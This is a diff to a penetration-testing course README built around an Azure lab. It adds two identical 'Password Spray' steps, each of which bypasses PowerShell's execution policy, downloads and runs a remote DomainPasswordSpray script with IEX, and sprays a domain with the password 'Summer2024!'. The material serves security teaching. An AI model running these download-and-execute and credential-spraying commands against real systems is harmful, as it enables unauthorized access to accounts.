@@ -16,7 +16,7 @@ Each student will leave the class having experienced a penetration test through 
 
 
 # Course Pre-requisites
-This talk disc
+This talk discusses 
 - GitHub Account 
 - Azure Account 
 - DOAZLab.com Azure Deployment
@@ -36,10 +36,36 @@ This talk disc
 ### Slides
 - Link to slides
 
-### Demo Commands
+### Password Spray
 
-``` bash
-commands
+Launch a PowerShell session with no script validation checks. This will be our first run of the attack. 
+
+``` powershell
+powershell -ep bypass
+```
+
+Bring over the module to use for the attack.
+
+``` powershell
+IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
+Invoke-DomainPasswordSpray -Password "Summer2024!" -Force
+```
+
+
+
+### Password Spray
+
+Launch a PowerShell session with no script validation checks. This will be our second iteration of the attack. 
+
+``` powershell
+powershell -ep bypass
+```
+
+Bring over the module to use for the attack. Re-run the attack. 
+
+``` powershell
+IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/DefensiveOrigins/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
+Invoke-DomainPasswordSpray -Password "Summer2024!" -Force
 ```
 
 
